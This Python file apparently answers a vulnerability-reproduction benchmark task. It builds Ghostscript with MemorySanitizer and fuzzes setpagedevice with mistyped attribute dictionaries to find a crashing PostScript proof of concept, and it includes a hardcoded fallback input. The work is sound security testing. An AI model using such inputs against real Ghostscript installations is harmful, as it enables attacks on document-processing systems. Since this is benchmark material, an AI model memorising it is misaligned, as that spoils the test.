import os
import subprocess
import shutil
import tempfile
import sys

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the vulnerability.
        
        Strategy:
        1. Extract the source code.
        2. Compile the target (Ghostscript) with MemorySanitizer (MSan) enabled.
        3. Identify the 'gs' executable.
        4. Fuzz the executable with PostScript inputs specifically targeting 'setpagedevice' 
           and attribute dictionary conversions, which matches the vulnerability description.
        5. Return the PoC that triggers an MSan error.
        """
        work_dir = tempfile.mkdtemp()
        try:
            # 1. Extract source
            # Redirect output to DEVNULL to keep logs clean
            subprocess.run(["tar", "xf", src_path, "-C", work_dir], 
                         check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            
            # Locate source root (where configure script is)
            source_root = work_dir
            for root, dirs, files in os.walk(work_dir):
                if "configure" in files:
                    source_root = root
                    break
            
            # 2. Build with MSan
            env = os.environ.copy()
            env['CC'] = 'clang'
            env['CXX'] = 'clang++'
            # MSan flags: -fsanitize=memory, -g for debug info (optional but good), -O1 for speed
            flags = "-fsanitize=memory -g -O1 -fno-omit-frame-pointer"
            env['CFLAGS'] = flags
            env['CXXFLAGS'] = flags
            env['LDFLAGS'] = flags
            
            # Configure Ghostscript to be minimal and fast to build
            if os.path.exists(os.path.join(source_root, "configure")):
                conf_cmd = [
                    "./configure",
                    "--disable-shared",
                    "--disable-gtk",
                    "--disable-cups",
                    "--without-x",
                    "--disable-compile-inits"
                ]
                subprocess.run(conf_cmd, cwd=source_root, env=env, 
                             stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                subprocess.run(["make", "-j8"], cwd=source_root, env=env, 
                             stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            
            # 3. Find executable
            exe_path = None
            for root, dirs, files in os.walk(source_root):
                if "gs" in files:
                    path = os.path.join(root, "gs")
                    if os.access(path, os.X_OK):
                        exe_path = path
                        break
            
            if not exe_path:
                # Fallback if build fails: return a probable PoC
                return b"{ << /InputAttributes << 0 1 >> >> setpagedevice } stopped pop"

            # Setup GS_LIB for Ghostscript resources
            lib_paths = []
            for root, dirs, files in os.walk(work_dir):
                if "gs_init.ps" in files: lib_paths.append(root)
                if "Resource" in dirs: lib_paths.append(os.path.join(root, "Resource"))
                if "lib" in dirs: lib_paths.append(os.path.join(root, "lib"))
            env['GS_LIB'] = ":".join(lib_paths)

            # 4. Fuzzing Loop
            # Target "unsuccessful attribute conversions"
            keys = ["InputAttributes", "OutputAttributes", "PageSize", "HWResolution", "Margins", "ViewerPreferences"]
            bad_vals = ["(bad)", "1", "true", "null", "[]", "<< >>"]
            
            # Try simple attribute type mismatch
            for k in keys:
                for v in bad_vals:
                    # Wrapped in 'stopped' to ensure fixed version exits with 0 (handled error)
                    poc = f"{{ << /{k} {v} >> setpagedevice }} stopped pop".encode()
                    if self._check_crash(exe_path, poc, env):
                        return poc
                    
                    # Try nested structure for Attributes (dict of int -> dict)
                    # Vulnerability is often in converting the inner value
                    if "Attributes" in k:
                        poc = f"{{ << /{k} << 0 {v} >> >> setpagedevice }} stopped pop".encode()
                        if self._check_crash(exe_path, poc, env):
                            return poc

        except Exception:
            pass
        finally:
            shutil.rmtree(work_dir, ignore_errors=True)
            
        # Default fallback
        return b"{ << /InputAttributes << 0 1 >> >> setpagedevice } stopped pop"

    def _check_crash(self, exe, data, env):
        with tempfile.NamedTemporaryFile(mode='wb', delete=False) as f:
            f.write(data)
            fname = f.name
        
        try:
            # Run GS with safe options
            res = subprocess.run(
                [exe, "-q", "-dSAFER", "-dBATCH", "-dNODISPLAY", fname],
                env=env,
                stdout=subprocess.DEVNULL,
                stderr=subprocess.PIPE,
                timeout=2
            )
            # Check for MSan report in stderr
            if b"MemorySanitizer" in res.stderr:
                return True
        except subprocess.TimeoutExpired:
            pass
        except Exception:
            pass
        finally:
            if os.path.exists(fname):
                os.unlink(fname)
        return False
